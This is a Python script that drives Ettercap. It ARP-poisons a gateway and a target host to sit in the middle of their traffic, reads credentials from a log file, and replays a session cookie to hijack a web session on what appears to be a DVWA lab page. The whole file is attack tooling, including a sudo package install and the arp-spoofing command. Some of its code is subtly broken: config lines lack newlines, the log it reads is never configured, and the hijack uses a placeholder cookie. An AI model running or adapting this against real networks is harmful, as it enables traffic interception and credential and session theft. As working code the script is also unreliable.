import os
import requests
import subprocess

# Man-in-the-Middle (MitM) attacks are where an attacker inserts themselves into communication between two parties.
# They commonly intercept, modify, or manipulate communications in these attacks to extract information or execute commands.
# Ettercap is a popular network security tool that's capable of performing MitM attacks, making it ideal for this purpose.
# This Python class demonstrates how to use Ettercap to sniff and hijack a session to a web application for demonstration purposes.

class EttercapMitM:
    def __init__(self):
        self.target_url = "http://127.0.0.1/vulnerabilities/xss_d/"

    def setup_ettercap(self):
        self.ettercap_conf_path = "/tmp/etter.conf"
        
        try:
            with open(self.ettercap_conf_path, 'w') as f:
                f.writelines([
                    "redir_commands = iptables",
                    "ec_uid = 0",
                    "ec_gid = 0",
                    "iflist = 0",
                ])
        
            # Making sure that Ettercap is properly installed
            subprocess.run(["sudo", "apt-get", "install", "ettercap-graphical", "-y"], check=True)
        except Exception as e:
            print(f"Unable to set up Ettercap configuration: {e}")

    def initiate_mitm_attack(self, iface, gateway_ip, target_ip):
        try:
            # Executing the Ettercap command to start the attack
            ettercap_command = [
                "sudo", "ettercap", "-T", "-q", "-i", iface,
                "-M", "arp", f"/{gateway_ip}//", f"/{target_ip}//", 
                "-P", "autoadd-password"
            ]
            subprocess.Popen(ettercap_command)
        except Exception as e:
            print(f"Failed to start Ettercap MITM attack: {e}")

    def sniff_traffic(self):
        try:
            # Reading credentials from Ettercap log files
            return self.read_ettercap_log().strip()
        except Exception as e:
            print(f"An error occurred while sniffing traffic: {e}")
            return None

    def hijack_session(self, intercepted_credentials):
        with requests.Session() as s:
            # Automatically continue the session with intercepted credentials
            s.cookies.update(intercepted_credentials)
            response = s.get(self.target_url)
            if response.ok:
                return response.text
            else:
                return None

    def read_ettercap_log(self):
        ettercap_log_path = "/tmp/ettercap_log.txt"
        try:
            with open(ettercap_log_path, "r") as log_file:
                return log_file.read()  # Parsing the necessary credentials info 
                                    # (Assume intercepted credentials are stored there)
                '''Example content in /tmp/ettercap_log.txt:
                   *** INTERCEPTED CREDENTIALS ***
                   username=admin
                   password=admin123
                   ***
                '''
        except FileNotFoundError:
            print("Ettercap log not found: Please rerun the MITM attack to ensure logs are written properly.")
            return None

def main():
    et = EttercapMitM()
    et.setup_ettercap()
    interface = "eth0"  # Network interface/interface card in use
    gw_ip = "192.168.1.1"  # Gateway IP address
    tgt_ip = "192.168.1.100"  # Target IP address

    et.initiate_mitm_attack(interface, gw_ip, tgt_ip)
    credentials = et.sniff_traffic()
    if credentials:
        print("Intercepted Credentials:", credentials)
        hijacked_page = et.hijack_session({'session': 'hijacked_cookie_value'})  # Replace with intercepted session
        if hijacked_page:
            print("Session content successfully hijacked:", hijacked_page)
        else:
            print("Failed to retrieve the target URL content during hijacked session.")

if __name__ == "__main__":
    main()

